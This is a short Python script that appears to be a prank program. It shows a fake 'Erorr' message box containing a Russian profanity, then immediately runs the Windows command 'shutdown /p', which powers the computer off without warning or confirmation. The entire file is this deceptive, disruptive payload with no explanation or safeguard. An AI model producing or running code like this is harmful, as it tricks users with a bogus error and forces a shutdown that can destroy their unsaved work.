import os
from os import error
import random
import tkinter as tk
from tkinter import messagebox
import time





def shotdown():
    os.system("shutdown /p")

def erorr():
    messagebox.showerror("Erorr   ", "     suka blyat     ")
    time.sleep(0.2)


erorr()
shotdown()